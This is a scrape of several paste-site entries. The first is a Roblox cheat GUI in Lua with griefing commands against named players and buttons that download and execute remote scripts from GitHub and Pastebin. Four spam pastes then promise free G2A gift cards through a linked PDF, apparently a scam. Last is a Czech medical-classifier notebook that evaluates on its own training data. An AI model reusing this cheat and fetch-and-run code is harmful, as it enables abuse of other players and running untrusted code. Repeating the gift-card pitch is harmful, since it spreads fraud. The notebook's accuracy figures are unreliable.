        game.Players:Chat("";gear me 139578207"")
   end    
})

Tab:AddButton({
 Name = ""Rainbow Periastron Sword"",
 Callback = function()
        game.Players:Chat("";gear me 159229806"")
   end    
})

Tab:AddButton({
 Name = ""Bone Sword(OP)"",
 Callback = function()
        game.Players:Chat("";gear me 95951291"")
   end    
})

Tab:AddButton({
	Name = ""Black Hole Ray(Half OP)"",
	Callback = function()
      		game.Players:Chat("";gear me 78005009"")
  	end    
})

Tab:AddButton({
	Name = ""Rocket launcher(Half OP)"",
	Callback = function()
      		game.Players:Chat("";gear me 67747912"")
  	end    
})

Tab:AddButton({
	Name = ""Gravity Hummer(Half OP)"",
	Callback = function()
      		game.Players:Chat("";gear me 33866846"")
  	end    
})

Tab:AddButton({
	Name = ""Platform Producer(Half OP)"",
	Callback = function()
      		game.Players:Chat("";gear me 34898883"")
  	end    
})

Tab:AddButton({
	Name = ""Bear Gun(Half OP)"",
	Callback = function()
      		game.Players:Chat("";gear me 90718350"")
  	end    
})

Tab:AddButton({
	Name = ""Remote Bomb(OP)"",
	Callback = function()
      		game.Players:Chat("";gear me 33383241"")
  	end    
})

Tab:AddDropdown({
	Name = ""Divine horn"",
	Default = """",
	Options = {""Get Divine Horn"", ""Multi Activation"", ""Spam Activation""},
	Callback = function(Value)
		if Value == ""Get Divine Horn"" then
		game.Players:Chat("";gear me 127506257"")
		end
		if Value == ""Multi Activation"" then
		local args = {
    [1] = ""DO THE THING!!!""
}

game:GetService(""Players"").LocalPlayer.Character.KOSSGustHorn.RemoteEvent:FireServer(unpack(args))
		end
		if Value == ""Spam Activation"" then
		while game:GetService(""RunService"").RenderStepped:wait() do
		local args = {
    [1] = ""DO THE THING!!!""
}

game:GetService(""Players"").LocalPlayer.Character.KOSSGustHorn.RemoteEvent:FireServer(unpack(args))
		end
		end
	end    
})

Tab:AddButton({
	Name = ""Spray Paint(OP)"",
	Callback = function()
      		game.Players:Chat("";gear me 80576967"")
  	end    
})

Tab:AddButton({
	Name = ""Hammer Judges(Half OP)"",
	Callback = function()
      		game.Players:Chat("";gear me 1046322934"")
  	end    
})

Tab:AddButton({
	Name = ""Resize tool(OP)"",
	Callback = function()
      		game.Players:Chat("";gear me 16969792"")
  	end    
})

Tab:AddButton({
	Name = ""Staff of Fire"",
	Callback = function()
      		game.Players:Chat("";gear me 32858741"")
  	end    
})

Tab:AddButton({
	Name = ""Glove(Half OP)"",
	Callback = function()
      		game.Players:Chat("";gear me 65469882"")
  	end    
})

Tab:AddButton({
 Name = ""Thief coin(Half OP)"",
 Callback = function()
        game.Players:Chat("";gear me 117544573"")
   end    
})

Tab:AddButton({
 Name = ""Zombie staff"",
 Callback = function()
        game.Players:Chat("";gear me 26421972"")
   end    
})

Tab:AddButton({
 Name = ""Za warudo"",
 Callback = function()
         game.Players:Chat("";gear me 71037101"")
   end    
})

Tab:AddButton({
 Name = ""Taser(Half OP)"",
 Callback = function()
        game.Players:Chat("";gear me 82357123"")
   end    
})

Tab:AddDropdown({
	Name = ""Snowball"",
	Default = """",
	Options = {""Get Snowball"", ""Spam Snowballs""},
	Callback = function(Value)
		if Value == ""Get Snowball"" then
		game.Players:Chat("";gear me 19328185"")
		end
		if Value == ""Spam Snowballs"" then
		local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == ""Snowball"" then
       v.Parent = LP.Character
   end
end
while true do
   wait(0.25)
   for i,v in pairs (LP.Character:GetChildren()) do
       if v.Name == ""Snowball"" then
           v:Activate()
       end
   end
   task.wait(0.25)
end
		end
	end
})

local Tab = Window:MakeTab({
	Name = ""Silent CMD"",
	Icon = ""rbxassetid://4370318685"",
	PremiumOnly = false
})

Tab:AddTextbox({
	Name = ""CMD"",
	Default = """",
	TextDisappear = true,
	Callback = function(Value)
		game.Players:Chat("";"" .. Value .."""")
	end	  
})

local Section = Tab:AddSection({
	Name = ""For intellectually developed people""
})

Tab:AddTextbox({
	Name = ""Uncmdbar2"",
	Default = ""Username"",
	TextDisappear = true,
	Callback = function(Value)
		game.Players:Chat("";Uncmdbar2 "".. Value .."""")
	end	  
})

local Tab = Window:MakeTab({
	Name = ""GUIS"",
	Icon = ""rbxassetid://4483345998"",
	PremiumOnly = false
})

Tab:AddButton({
	Name = ""Fedoratum admin"",
	Callback = function()
      		loadstring(game:HttpGet(""https://raw.githubusercontent.com/zephyr10101/showcases/main/fedoratumadmin"",true))()
  	end    
})

Tab:AddButton({
	Name = ""Silent CMD"",
	Callback = function()
      		loadstring(game:HttpGet(""https://pastebin.com/raw/pGe3C71V""))()
  	end    
})

local Tab = Window:MakeTab({
                    Name = ""Defense"",
                    Icon = ""http://www.roblox.com/asset/?id=7734056608"",
                    PremiumOnly = false
                })

Tab:AddToggle({
	Name = ""Anti slowdown"",
	Default = false,
	Callback = function(Value)
		AntiSlowdown = Value
		while AntiSlowdown do
		if game.Players.LocalPlayer.Character.Humanoid.WalkSpeed < 9 then
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
		end
		if game.Players.LocalPlayer.Character.Humanoid.JumpPower < 25 then
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
		end
		task.wait()
		end
	end    
})

Tab:AddToggle({
	Name = ""Anti mute"",
	Default = false,
	Callback = function(Value)
		AntiMute = Value
		while AntiMute do
local sgui = game:GetService(""StarterGui"")
sgui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
task.wait()
end
	end    
})

Tab:AddToggle({
 Name = ""Anti kill"",
 Default = fasle,
 Callback = function(Value)
        AntiKill = Value
        while AntiKill do
        if game:GetService(""Players"").LocalPlayer.Character.Humanoid.Health == 0 then
        game.Players:Chat("";refresh"")
        end
        task.wait(0.2)
        end
   end    
})

Tab:AddToggle({
	Name = ""Anti Void"",
	Default = false,
	Callback = function(Value)
	AntiVoid = Value
		local part = Instance.new(""Part"")
part.Name = ""AntiFallPart""
part.Size = Vector3.new(50000, 5, 50000)
part.Transparency = 1
part.Anchored = AntiVoid
part.Position = Vector3.new(-1, -100, 66)
part.Parent = game.Workspace
	end 
})

Tab:AddToggle({
	Name = ""Anti freeze"",
	Default = false,
	Callback = function(Value)
	AntiFreeze = Value
	while AntiFreeze do
	      game.Players:Chat("";thaw"")
	task.wait(1.8)
	end
	end    
})

Tab:AddToggle({
	Name = ""Anti jail"",
	Default = false,
	Callback = function(Value)
	AntiJail = Value
	while AntiJail do
	      game.Players:Chat("";unjail"")
	task.wait(1.8)
	end
	end    
})

Tab:AddToggle({
	Name = ""Anti control"",
	Default = false,
	Callback = function(Value)
	AntiControl = Value
	while AntiControl do
	      game.Players:Chat("";uncontrol"")
	task.wait(1.8)
	end
	end    
})

local Tab = Window:MakeTab({
	Name = ""Extra"",
	Icon = ""rbxassetid://7733955740"",
	PremiumOnly = false
})

Tab:AddTextbox({
	Name = ""Heavenly Prison"",
	Default = ""Username"",
	TextDisappear = true,
	Callback = function(Value)
last_pick_sin_mrazy = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame 
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1e9, 1e8, 0) 
    wait(0.1) 
    game.Players:Chat("";Bring "".. Value .."""")
wait(1)
game.Players:Chat("";jail "" .. Value .."""")
wait(1)
    game. Players.LocalPlayer.Character.HumanoidRootPart.CFrame = last_pick_sin_mrazy
	end	  
})

Tab:AddTextbox({
	Name = ""Death countdown"",
	Default = ""Username"",
	TextDisappear = true,
	Callback = function(Value)
		game.Players:Chat("";countdown 10"")
		wait(10)
		game.Players:Chat("";explode "" .. Value .."""")
	end	  
})

Tab:AddTextbox({
	Name = ""Disabled person"",
	Default = ""Username"",
	TextDisappear = true,
	Callback = function(Value)
		game.Players:Chat("";Jumppower "" .. Value .."" 0"")
		game.Players:Chat("";sit "" .. Value .."""")
		game.Players:Chat("";Speed "" .. Value .."" 0"")
	end	  
})

Tab:AddTextbox({
	Name = ""Kill player"",
	Default = ""Username"",
	TextDisappear = true,
	Callback = function(Value)
	game.Workspace.Gravity = 0
		last_pick_sin_mrazy = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame 
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-354, -370, -38) 
    wait(1)
    game.Players:Chat("";unfly "" .. Value .."""")
    game.Players:Chat("";clip "" .. Value .."""")
    game.Players:Chat("";Bring "" .. Value .."""")
    wait()
    game. Players.LocalPlayer.Character.HumanoidRootPart.CFrame = last_pick_sin_mrazy 
    game.Workspace.Gravity = 200
	end	  
})

Tab:AddTextbox({
	Name = ""Singularity"",
	Default = ""Username"",
	TextDisappear = true,
	Callback = function(Value)
		game.Players:Chat("";warp "" .. Value .."""")
		wait(3.45)
		game.Players:Chat("";apparate "" .. Value .."" 10000"")
	end	  
})

Tab:AddButton({
 Name = ""Drop tools"",
 Callback = function()
        for i,v in pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
   if v:IsA(""Tool"")  then
    game:GetService(""RunService"").RenderStepped:wait()
    v.Parent = game.Players.LocalPlayer.Character
    game:GetService(""RunService"").RenderStepped:wait()
    v.Parent = game.Workspace
end
end
   end    
})

Tab:AddButton({
 Name = ""Multi gear(press E)"",
 Callback = function()
        lp = game:GetService(""Players"").LocalPlayer

game:GetService(""UserInputService"").InputBegan:Connect(function(key)
 if key.KeyCode == Enum.KeyCode.E then
  for i,tool in pairs(lp.Backpack:GetChildren()) do
   if tool:IsA(""Tool"") then
    tool.Parent = lp.Character
    tool:Activate()
    task.wait()
    tool.Parent = lp.Backpack
   end
  end
 end
end)
   end    
})

Tab:AddButton({
 Name = ""Check item name"",
 Callback = function()
        local player = game.Players.LocalPlayer
local function getCurrentItemInHand()
    if player.Character then
        for _, item in pairs(player.Character:GetChildren()) do
            if item:IsA(""Tool"") then
                return item.Name
            end
        end
    end
    return ""No object in hand""
end

print(getCurrentItemInHand())
   end    
})

Tab:AddTextbox({
	Name = ""takeHimtoHeaven"",
	Default = ""Username"",
	TextDisappear = true,
	Callback = function(Value)
		game.Players:Chat("";Jumppower "" .. Value .."" 99999"")
		game.Players:Chat("";sit "" .. Value .."""")
		game.Players:Chat("";jump "" .. Value .."""")
	end	  
})"
2d0zjQNp,🤑G2A.com Free Gift Card Guide 2024 May🔥,Alfonso1119,Python,Tuesday 28th of May 2024 06:46:26 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_1737385.pdf

Working as of:

29 May 2024"
1XybaK2e,💰G2A.com Free Gift Card Guide 2024 May🚀,Garoam,Python,Tuesday 28th of May 2024 06:39:41 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Steam gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_1737385.pdf

Working as of:

29 May 2024"
HfJJibtq,💰G2A.com Free Gift Card Guide 2024 May🚀,atakan1983,Python,Tuesday 28th of May 2024 06:32:57 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Xbox gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_1737385.pdf

Working as of:

29 May 2024"
95zXMEH2,🎉G2A.com Free Gift Card Guide 2024 May🔥,pestinha,Python,Tuesday 28th of May 2024 06:19:27 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_1737385.pdf

Working as of:

29 May 2024"
x6qag8qm,quite good VK,max2201111,Python,Tuesday 28th of May 2024 05:46:12 PM CDT,"#Navod na pouziti, Mgr. Hynek Mlčoušek, v Brne 2.5.2024
#Ulozte do lokalniho souboru u sebe na PC data tohoto tvaru vzdy ukoncene 0 ci 1 (jde o uceni s ucitelem: 1 = nemocny, 0 = prezil/zdravy, ve vystupu bude zelena znacit 0, cervena 1)  a bez znaku #; pozor na "",""

# [ [23.657800719276743,18.859916797201468,0],
# [22.573729142097473,17.96922325097786,0],
# [32.55342396968757,29.463651408558803,0],
# [6.718035041529263,25.704665468161718,1],
# [14.401918566243225,16.770856492924658,0],
# [17.457907312962234,21.76521470574044,0],
# [20.02796946568093,73.45445954770891,1],
# [30.295138369778076,62.901112886193246,1],
# [15.128977804449633,32.40267702110393,0],
# [30.179457395820013,58.982492125646104,1],
# [28.01649701854089,63.92781357637711,1],
# [16.791838457871147,42.33482314089884,0],
# [10.583694293380976,19.61926728942497,0],
# [26.634447074406467,91.96624817360987,1],
# [26.217868623367643,36.400293587062976,0],
# [17.689396788624936,60.79797114006423,1],
# [33.17193822527976,66.75277364959176,1],
# [23.793952755709153,22.57501437360518,0]]

#kliknete na cerne tlacitko s trojuhelnickem vlevo nahore
#pod kodem se objevi moznost spustit dialogove okenko, kliknete na nej
#soubor, ktery mate z bodu vyse vyberte a nahrajte
#Najdete v tomto kodu retezec:
###ZDE VLOZTE DATA OD NOVYCH PACIENTU

#Vlozte do pole
# new_persons_results = []
# data o nekolika malo novych pacientech bez ukoncovaci 0 a 1, ale se stejnym poctem sloupcu jako ma soubor z Vaseho lokalniho disku, vyse by tedy toto bylo rovno 2
#kod vyhodi hned po natrenovani, (jehoz prubeh muzete sledovat na modre progres bare) pro kazdy radek z new_persons_results bilo-sedo-cerne ctverecky vznikle z normalizace poskytnutych dat a ukoncovaci ctverecek cerveny pripadne zeleny
#zaroven s tim se vypise realne cislo mezi 0 a 1 znacici jak moc je pacient zdravy (blizke 0) ci nemocny (blizke 1)
#cisla uprostred pak indikuji zadany oranzovy semafor.
#je na lekarich nastavit tresholdy (tedy pravdepodobnosti: cisla mezi 0 a 1) ktere pak daji zaver, zda je pacient cerveny, oranzovy ci zeleny

# prosim o komnetare a vysledky na realnych datech, je zadouci aby radku v matici, tedy pacientu byly stovky a sloupcu desitky
# Moznosti vyuziti: onkologicka diagnoza vs. zdrava kontorlni skupina, diabetes (pritomnost/nepritomnost), testovani noveho leku oproti placebu atd.

#kod zaroven vyhodi confusion matici, tedy mozne True Negative a False Positive plus spravne zarazene hodnoty spolu s presnosti,F1 score recall atd.
#poznamka ke kodu: jde o epxerimentalni verzi, ktera krome skutecne potrebneho kodu obsahuje ladici informace, ruzne duplicity, nadbytecne prikazy atd.
# Na uvod behu programu se pro kontorlu vypise poskytnuta matice a jeji normalizovana verze, je treba sjet jezdcem napravo nize na obrazky a dalsi vystupy

#Dekuji profesoru Petru Dostalovi za namet k teto praci a poskytnuta data, byt je potreba mit data realna

import numpy as np
import matplotlib.pyplot as plt
import tensorflow as tf
from tqdm import tqdm


from IPython.display import display
from IPython.display import Javascript
display(Javascript('IPython.OutputArea.auto_scroll_threshold = 9999;'))

label_colors = {0: [0, 128, 0], 1: [255, 0, 0]}
label_colors_testing = {0: [0, 128, 0], 1: [255, 0, 0]}


%matplotlib inline



# Function to create images based on predictions
def create_image(data, predictions):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Create a gradient based on the normalized values
        gradient_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
        image[i, -1] = np.array([gradient_value] * 3)

    return image

def create_image(data, predictions):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use red for class 0 and green for class 1
        if predictions[i] == 0:
            image[i, -1] = np.array([255, 0, 0])  # Red
        elif predictions[i] == 1:
            image[i, -1] = np.array([0, 128, 0])  # Green

    return image

def create_image(data, predictions, label_colors):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        image[i, -1] = label_colors[predictions[i]]

    return image



def create_imageN(data, predictions, label_colors=None):
    num_training_rows = len(data)  # Set the number of rows based on the data
    num_columns = len(data[0])

    image_training = np.zeros((num_training_rows, num_columns + 1, 3), dtype=np.uint8)

    min_pixel_value = np.min(X_train_normalized)
    max_pixel_value = np.max(X_train_normalized)




    for i in range(num_training_rows):
        # Normalize the first columns independently
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image_training[i, j] = np.array([pixel_value] * 3)

        # Normalize the last column separately to achieve grayscale
        pixel_value_last = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[i, -1] = np.array([pixel_value_last] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image_training[i, -1] = label_colors[predictions[i]]

    return image_training




# Load data from a file
#file_path = 'C:/Users/Hynek/Desktop/example4.txt'
from google.colab import files
uploaded = files.upload()

# Tento kód otevře dialogové okno pro výběr souboru z vašeho počítače.
import io
import pandas as pd

# Předpokládáme, že jste nahráli CSV soubor
for fn in uploaded.keys():
  print('User uploaded file ""{name}"" with length {length} bytes'.format(
      name=fn, length=len(uploaded[fn])))
  path = io.BytesIO(uploaded[fn])  # Pro soubory, které potřebují být čteny jako binární objekty
  df = pd.read_csv(path)
  print(df.head())  # Vypíše prvních pět řádků DataFrame


all_results = []
#with open(file_path, 'r') as file:
#    file_content = file.read()

# Execute the content as Python code
##exec(file_content)

import os
import shutil
import ast

for filename in uploaded.keys():
    original_path = f""/content/{filename}""
    destination_path = os.path.join(""/content/"", ""/content/DATA2"")
    shutil.move(original_path, destination_path)
    print(f""Soubor {filename} byl přesunut do {destination_path}"")

file_path = '/content/DATA2'  # Cesta k souboru
with open(file_path, 'r') as file:
    code = file.read()

A_list = ast.literal_eval(code)


# Převod na NumPy pole
A = np.array(A_list)

#exec(code)

# Now, all_results contains lists corresponding to each row in the CSV file
##print(all_results)

# Assign values to variables dynamically based on the rows of matrix A
for i, row in enumerate(A, start=1):
    globals()[f""person{i}_results""] = list(row)

# Print the assigned variables
for i in range(1, len(A) + 1):
  #  print(f""person{i}_results {globals()[f'person{i}_results']}"")
    all_results.append(f""person{i}_results"")
##print(all_results)



result_variables = []

# Loop through the variable names and get the corresponding variables using globals()
for var_name in all_results:
    result_variables.append(globals()[var_name])

# Now, result_variables contains the variables with names specified in variable_names
#print(result_variables)

all_results = result_variables
new_persons_results = result_variables



labels = [results[-1] for results in all_results]

# Odstranění posledního sloupce z datasetu
data = [results[:-1] for results in all_results]

# Definice počtu řádků pro trénování a testování
num_training_rows = 100
num_testing_rows = 100

# Rozdělení datasetu na trénovací a testovací sady
X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_testing_rows], labels[:num_training_rows], labels[:num_testing_rows]

# Převod na NumPy pole
X_train = np.array(X_train)
X_test = np.array(X_test)
y_train = np.array(y_train)
y_test = np.array(y_test)

# Normalizace dat (s ohledem na -1)
min_values = np.min(X_train[X_train != -1], axis=0)
max_values = np.max(X_train[X_train != -1], axis=0)
X_train_normalized = (X_train - min_values) / (max_values - min_values)



import numpy as np
import tensorflow as tf
import matplotlib.pyplot as plt
from sklearn.metrics import confusion_matrix, accuracy_score, precision_score, recall_score, f1_score
import seaborn as sns
from tqdm.notebook import tqdm_notebook



import numpy as np
import matplotlib.pyplot as plt
import tensorflow as tf
from tqdm.notebook import tqdm_notebook

# Průměry (mu) a směrodatné odchylky (sigma)
mu = np.mean(X_train, axis=0)
sigma = np.std(X_train, axis=0)

# Normalizace každého sloupce zvlášť
X_train_standardized = (X_train - mu) / sigma
X_test_standardized = (X_test - mu) / sigma

# Vylepšený model
model = tf.keras.Sequential([
    tf.keras.layers.Dense(256, activation='relu', input_shape=(len(X_train[0]),)),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(128, activation='relu'),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(64, activation='relu'),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(1, activation='sigmoid')
])

# Použití Adam optimizer s learning rate schedulerem
lr_schedule = tf.keras.optimizers.schedules.ExponentialDecay(
    initial_learning_rate=1e-3,
    decay_steps=10000,
    decay_rate=0.9
)
optimizer = tf.keras.optimizers.Adam(learning_rate=lr_schedule)

# Kompilace modelu
model.compile(optimizer=optimizer, loss='binary_crossentropy', metrics=['accuracy'])

# Lists to store accuracy values
accuracy_history = []

# Create images for the training data
image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)

min_pixel_value = np.min(X_train_standardized, axis=0)
max_pixel_value = np.max(X_train_standardized, axis=0)

for i, label in enumerate(y_train):
    for j in range(len(X_train_standardized[0])):
        pixel_value = int(np.interp(X_train_standardized[i][j], [min_pixel_value[j], max_pixel_value[j]], [0, 255]))
        image_training[i, j] = np.array([pixel_value] * 3)
    image_training[i, -1] = np.array([128, 128, 128])
    if label == 0:
        image_training[i, -1] = np.array([0, 128, 0])
    elif label == 1:
        image_training[i, -1] = np.array([255, 0, 0])

# Training the model
epochs = 139
new_persons_results = [
    [23.65780072, 18.8599168],
    [22.57372914, 17.96922325],
    [32.55342397, 29.46365141],
    [ 6.71803504, 25.70466547],
    [14.40191857, 16.77085649],
    [17.45790731, 21.76521471],
    [20.02796947, 73.45445955],
    [26.2042, 10.6782],
    [35.7258, 12.8027],
    [21.2, 7.8],
    [50.1, 40.2],
    [32.739, 42.0152],
    [28.1, 10.1],
]

import sys

for epoch in tqdm_notebook(range(epochs)):
    history = model.fit(X_train_standardized, np.array(y_train), epochs=1, verbose=0, shuffle=False)
    accuracy_history.append(history.history['accuracy'][0])

    if epoch == 1:
        # Normalize the testing data
        X_test_standardized = (X_test - mu) / sigma
        y_pred_after_2nd_epoch = model.predict(X_test_standardized)
        y_pred_binary_after_2nd_epoch = [1 if pred >= 0.5 else 0 for pred in y_pred_after_2nd_epoch]
        image_testing_before_2nd_epoch = create_image(X_test_standardized, y_pred_binary_after_2nd_epoch, label_colors_testing)

    if epoch >= epochs-1:
        print(f""HERE HERE Epoch: {epoch}, Epochs: {epochs}\n"")
        sys.stdout.flush()

        # Iterate through new persons
        for idx, personNEW_results in enumerate(new_persons_results, start=0):
            # Ensure that personNEW_results has the same number of features as the model expects
            assert len(personNEW_results) == len(X_train[0]), ""Mismatch in the number of features.""

            personNEW_results_standardized = (np.array(personNEW_results) - mu) / sigma

            personNEW_prediction = model.predict(np.array([personNEW_results_standardized]))
            personNEW_label = 1 if personNEW_prediction >= 0.5 else 0
            y_pred_after_50_epochs = model.predict(X_test_standardized)
            y_pred_binary_after_50_epochs = [1 if pred >= 0.5 else 0 for pred in y_pred_after_50_epochs]
            image_testing_after_50_epochs = create_image(X_test_standardized, y_pred_binary_after_50_epochs, label_colors_testing)

            # Create an image for the new person
            image_personNEW = create_imageN([personNEW_results_standardized], [personNEW_label], label_colors)

            # Display the images
            plt.figure(figsize=(5, 5))
            plt.imshow(image_personNEW)
            plt.title(f""New Person {idx}\nLabel: {personNEW_label}, Prediction: {personNEW_prediction}, personNEW_results: {personNEW_results}"")
            plt.axis(""off"")
            plt.show()

# Display the images
plt.figure(figsize=(25, 15))
plt.subplot(2, 2, 1)
plt.imshow(image_training)
plt.title(""Training Data"")
plt.axis(""off"")

plt.subplot(2, 2, 2)
plt.imshow(image_testing_before_2nd_epoch)
plt.title(""Testing Data (2nd Epoch)"")
plt.axis(""off"")

plt.subplot(2, 2, 3)
plt.imshow(image_testing_after_50_epochs)
plt.title(f""Testing Data ({epochs} Epochs)"")
plt.axis(""off"")

plt.subplot(2, 2, 4)
plt.imshow(image_personNEW)
plt.title(f""New Person\nLabel: {personNEW_label},[{personNEW_prediction}]"")
plt.axis(""off"")

# Plot accuracy history
plt.figure(figsize=(12, 5))
plt.plot(range(1, epochs + 1), accuracy_history, marker='o')
plt.title('Accuracy Over Epochs')
plt.xlabel('Epochs')
plt.ylabel('Accuracy')
plt.grid()

# Print standardized data
print(""Standardized PersonNEW Data:"")
print(personNEW_results_standardized)

plt.show()

print(""X_train before standardization:"")
print(X_train)
print(""X_test before standardization:"")
print(X_test)

import seaborn as sns

print(""KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK"")
print(X_test)
print(""HHHHHHHHHHHHHHHHHHHHHHHHHHHHHH"")
print(X_train)
print(""LLLLLLLLLLLLLLLLLLLLLLLLLLLLL"")

# y_pred_binary = [1 if pred >= 0.5 else 0 for pred in model.predict(X_test_standardized)]

# # Create confusion matrix
# conf_matrix = confusion_matrix(y_train, y_pred_binary)
# print(conf_matrix)

from sklearn.metrics import confusion_matrix
from tensorflow.keras.utils import to_categorical

np.set_printoptions(threshold=np.inf, precision=4, suppress=True)

# Assuming X_test_standardized and y_test are your test set data
y_pred_binary = [1 if pred >= 0.5 else 0 for pred in model.predict(X_test_standardized)]

# Create confusion matrix using the test set
conf_matrix = confusion_matrix(y_test, y_pred_binary)
print(conf_matrix)

plt.figure(figsize=(6, 6))
sns.heatmap(conf_matrix, annot=True, fmt=""d"", cmap=""Blues"", xticklabels=['Predicted 0', 'Predicted 1'], yticklabels=['Actual 0', 'Actual 1'])
plt.xlabel(""Predicted Label"")
plt.ylabel(""True Label"")
plt.title(""Confusion Matrix"")
plt.show()

X_train = np.array(X_train)
#y_train_one_hot = np.array(y_train_one_hot)

# Rozdělení dat na trénovací a testovací množiny
X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_testing_rows], labels[:num_training_rows], labels[:num_testing_rows]

import numpy as np
import matplotlib.pyplot as plt
from sklearn.metrics import confusion_matrix, accuracy_score, precision_score, recall_score, f1_score
import tensorflow as tf
import seaborn as sns

# Assuming data splitting and model definition have been done correctly

# Compile the model
model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])

# Train the model
print(""Training Start"")
for epoch in tqdm_notebook(range(1000), desc=""Training Progress""):
    model.fit(np.array(X_train_standardized), np.array(y_train), epochs=1, verbose=0)
print(""Training Complete"")

# Generate predictions from the model
predictions = (model.predict(X_test_standardized) > 0.5).astype(int)

# Convert y_test to a numpy array and then to binary labels
y_test_array = np.array(y_test)  # Convert y_test to a numpy array
y_test_binary = (y_test_array > 0.5).astype(int)  # Convert to binary

# Compute the confusion matrix
conf_matrix = confusion_matrix(y_test_binary, predictions)

# Evaluate the model's performance
accuracy = accuracy_score(y_test_binary, predictions)
precision = precision_score(y_test_binary, predictions)
recall = recall_score(y_test_binary, predictions)
f1 = f1_score(y_test_binary, predictions)

# Display the confusion matrix
sns.heatmap(conf_matrix, annot=True, fmt='d', cmap='Blues')
plt.xlabel('Predicted')
plt.ylabel('Actual')
plt.title('Confusion Matrix')
plt.show()

print(f""Accuracy: {accuracy:.4f}"")
print(f""Precision: {precision:.4f}"")
print(f""Recall: {recall:.4f}"")
print(f""F1 Score: {f1:.4f}"")

print(f""Confusion Matrix2122:\n{conf_matrix}"")

import random

def find_best_pair(min_val, max_val, num_features, model, min_values, max_values):
    best_pair = None
    best_prediction = 1
    for _ in range(1000):  # Number of iterations to find the best pair
        new_data = np.random.uniform(min_val, max_val, num_features)
        new_data_standardized = (new_data - mu) / sigma
        
        # Suppress model output
        tf.get_logger().setLevel('ERROR')
        with tf.device('/CPU:0'):  # Ensure to run on CPU to minimize unwanted logs
            prediction = model.predict(np.array([new_data_standardized]), verbose=0)[0][0]
        tf.get_logger().setLevel('INFO')
        
        if prediction < best_prediction:
            best_prediction = prediction
            best_pair = new_data
    return best_pair, best_prediction

best_pair, best_prediction = find_best_pair(min_values, max_values, len(X_train[0]), model, min_values, max_values)

def find_worst_pair(min_val, max_val, num_features, model, min_values, max_values):
    worst_pair = None
    worst_prediction = 0
    for _ in range(1000):  # Number of iterations to find the best pair
        new_data = np.random.uniform(min_val, max_val, num_features)
        new_data_standardized = (new_data - mu) / sigma
        
        # Suppress model output
        tf.get_logger().setLevel('ERROR')
        with tf.device('/CPU:0'):  # Ensure to run on CPU to minimize unwanted logs
            prediction = model.predict(np.array([new_data_standardized]), verbose=0)[0][0]
        tf.get_logger().setLevel('INFO')
        
        if prediction > worst_prediction:
            worst_prediction = prediction
            worst_pair = new_data
    return worst_pair, worst_prediction

worst_pair, worst_prediction = find_worst_pair(min_values, max_values, len(X_train[0]), model, min_values, max_values)

print(f""Best Pair: {best_pair}, Best Prediction: {best_prediction}"")
print(f""Worst Pair: {worst_pair}, Worst Prediction: {worst_prediction}"")



import numpy as np
import matplotlib.pyplot as plt
import tensorflow as tf
from sklearn.metrics import recall_score, confusion_matrix, accuracy_score, precision_score, f1_score
import seaborn as sns
from tqdm.notebook import tqdm_notebook
from sklearn.decomposition import PCA
from sklearn.discriminant_analysis import LinearDiscriminantAnalysis as LDA



# Rozdělení na vstupní data (X) a cílové proměnné (y)
X = A[:, :-1]
y = A[:, -1]

# Rozdělení na trénovací a testovací sadu (v tomto příkladě použijeme celou sadu jako trénovací pro jednoduchost)
X_train, y_train = X, y
